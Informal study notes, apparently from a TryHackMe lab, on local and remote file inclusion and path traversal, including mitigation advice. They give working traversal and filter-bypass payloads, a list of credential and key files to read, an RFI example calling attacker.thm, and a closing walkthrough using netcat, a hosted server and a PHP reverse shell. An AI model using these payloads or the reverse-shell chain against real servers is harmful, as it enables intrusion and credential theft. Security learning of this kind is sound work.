File inclusion = 

LFI = local file inclusion 
RFI = remote file inclusion
directory traversal

web applications are written to request access to files on a given system, including images, static text, and so on via parameters.

http:// 	webapp.thm 	/get.php  	 ? 		 file 	=userCV.pdf

protocol	Domain name	FILENAME   query string begin	parameters

=----
parameter = used for google searching
where GET requests pass user input into the search engine. https://www.google.com/search?q=TryHackMe. If you are not familiar with the topic, you can view the How The Web Works module to understand the concept.

scenario where a user requests to access files from a webserver
- First, the user sends an HTTP request to the webserver that includes a file to display. 
- For example, if a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.
------------------------
why do file inclusion vulnerablilities happen ?
	they are commonly found and exploited in various programming languages for web applications
The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.
------------------------------
what is risk of file inclusion 
	By default, an attacker can leverage file inclusion vulnerabilities to leak data, such as code, credentials or other important files related to the web application or operating system. Moreover, if the attacker can write files to the server by any other means, file inclusion
 might be used in tandem to gain remote command executions RCE
------------------
path traversal = directory traversal = 
webserver vulnerabillity = allows an attacker to read operating system resources 
			   such as local files on the server running an application
can be exploited by manipulating the web application url 
to locate and access files or directories stored outside the application root directory

path traversal vulnerabilities occur
- when users input is passed to a function such as file_get_content in php
  in php you can use the function to read the content file 

/var/www/app
/var/www/app/CVs = user requesting content of userCV.pdf

can test url = adding payloads and see how behaves
path traversal attack = dot-dot-slash = ../

if entry point found = get.php?file=   = can send http://webapp.thm/get.php?file=../../../../etc/passwd

each ".." entry moves one directory "/" then it changes the directory to /etc and from there it read the passwd file or last file
----------------
if webapplication run on window server = attacker needs to provide window paths

if attacker reads the boot.ini file located c:\boot.ini then attacker can follow the target OS version
-
http://webapp.thm/get.php?file=../../../../boot.ini 
or
http://webapp.thm/get.php?file=../../../../windows/win.ini
-----
linux operating system = same concept applies here, climb directories until reach root = c:\
-----------
developers add filters to limit access to file or directory
below common OS files

/etc/issue	=	contains a message or system identification to be printed before the login prompt. 
/etc/profile	=	controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
/proc/version	=	specifies the version of the Linux kernel
/etc/passwd	= 	has all registered user that has access to a system
/etc/shadow	=	contains information about the system's users' passwords
/root/.bash_history	=	contains the history commands for root user
/var/log/dmessage	=	contains global system messages, including the messages that are logged during system startup
/var/mail/root		=	all emails for root user
/root/.ssh/id_rsa	=	Private SSH keys for a root or any known valid user on the server
/var/log/apache2/access.log	=	the accessed requests for Apache  webserve
C:\boot.ini	=	contains the boot options for computers with BIOS firmware

-------------
Local file inclusion LFI
LFI attacks on web applic caused by LACK OF SECURITY AWARENESS
- Include
- require
- include_once
- require_once
contribute to vulnerable web apps
LFI vulner also occur in ASP, JSP, PHP, Node.js apps

LFI exploit = same concept as path traversal
====
1st scenario
Suppose the web application provides two languages, and the user can select between the EN and AR
--------------
<?PHP 
	include($_GET["lang"]);
?>
====================
lang = GET request to include file of page
HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page 
or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.
-----------
2nd scenario
Next, In the following code, the developer decided to specify the directory inside the function.
---------------------
<?PHP 
	include("languages/". $_GET['lang']); 
?>
-----------------------
developer use the include function to call PHP pages in the languages directory only via lang parameters.
if no input validation, can be manipulated, url by replacing the lang input with other OS-sensitive files like /etc/passwd

include file = allows us to put any files
http://webapp.thm/index.php?lang=../../../../etc/passwd
ip_address/lab1.php?file=/etc/passwd
-------------------------------
1.

In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. 
If we enter an invalid input, such as THM, we get the following error

Warning: include(languages/THM.php): failed to open stream: 
No such file or directory in /var/www/html/THM-4/index.php on line 12
+++++++++++++++++++
from error we know
++++++++++++++++++++
- what the include function looks like
- can tell files languages directory is adding .php at the end of the entry 

index.php?lang=EN
EN = located inside the given languages directory and named EN.php

- also know full web appli directory path 
  /var/www/html/THM-4/
  to exploit we use ../ to get out current folder
http://webapp.thm/index.php?lang=../../../../etc/passwd
../ = 4 levels  = 4 directory
----------------------
Warning: include(languages/../../../../../etc/passwd.php):
 failed to open stream: No such file or directory in 
/var/www/html/THM-4/index.php on line 12

- include func reads input as .php still
  means that file type is specified 
  we can use NULL Byte which is %00
NULL Byte = an injection technique URL encoded representation like
%00 or 0x00
user supplied data to terminate strings 
= trick web app into disregarding whatever comes after NULL Byte

By adding the Null Byte at the end of the payload
it tells the include func to ignore evervything after NULL Byte
-----------------------------------------------------------------------------
include("languages/../../../../../etc/passwd%00").".php");
which equivalent to â†’ include("languages/../../../../../etc/passwd");
------------------------------------------------------------------------------
NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

2.
keywords are filtered to prevent accessing private info
we can use %00 or /. exploit 

if we try this concept in the file system using cd .. 
it will get you back one step; however, if you do cd . It stays in the current directory.

3.
next the following scenario developer starts to use input validation by filtering some keywords. 
----------------------------------------------------
Warning: include(languages/etc/passwd): 
failed to open stream: No such file or directory in
 /var/www/html/THM-5/index.php on line 15
---------------------------------------------------
we know
- the web appl replaces ../ with empty string
  First, we can send the following payload to bypass it:
   ....//....//....//....//....//etc/passwd
- This works because the PHP filter only matches and replaces the first subset string 
   ../ it finds and doesn't do another pass
-------------------------------------------
4.
developer forces the include to read from defined directory
 http://webapp.thm/index.php?lang=languages/EN.php then, 
to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd.
--------------------
Remote file inclusion = RFI = a technique to put remote files into vulnerabel applications
like LFI the RFI occurs when improperly sanitizing user input 
allow someone to inject an external URL into include func

one requirement
- RFI is that the allow_url_fopen option needs to be on

the risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain remote command execution RCE on the server

consequence of RFI attack
- sensitive info disclosure
- cross-site scripting (XSS)
- denial of service (DoS)

RFI steps 
Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. 
If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. 
As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. 
In our case, the current page somewhere has to show the Hello THM message.

--------------
T7
To prevent file inclussion vulnerabilities some common sugestion are
- Keep system and services, including web application frameworks, updated with the latest version.
- Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
- A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
- Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
- Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
- Never trust user input, and make sure to implement proper input validation against file inclusion.
- Implement whitelisting for file names and locations as well as blacklisting.

Steps for testing LFI
- Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
- Enter a valid input to see how the web server behaves.
- Enter invalid inputs, including special characters and common file names.
- Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
- Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
- Understand the input validation and if there are any filters!
- Try the inject a valid entry to read sensitive files

review T6 - T8

1. page source 
replace GET to POST
search etc/flag1

2. cookie editor 
value = ../../../../etc/flag2%00
has four directories

3.
curl -v â€˜http://<ip>/challenges/////////////////////////////////////////////chall3.phpâ€™ -X POST -d â€˜file=/etc/flag3%00â€™ -o flag3.txt

-v, â€” verbose Make the operation more talkative

-X, â€” request <command> Specify request command to use

-d, â€” data <data> HTTP POST data

once command inputted view the file
------------------
1. netcat = nc -nlvpnc -nlvp 4444
2. http server = python -m SimpleHTTPServer 8000
http.server

/webserver# python3 -m http.server;
#wget http://machine_ip:8000/filename

1 and 2 seperate machine
3.
php revers shell

Dont download on ur comp, vm only= http://pentestmonkey.net/tools/web-shells/php-reverse-shell
change ip and port 

should look like this
http://MACHINE_IP/playground.php?file=http://YOUR_IP:8000/php-reverse-shell.php

enter hostname in terminal



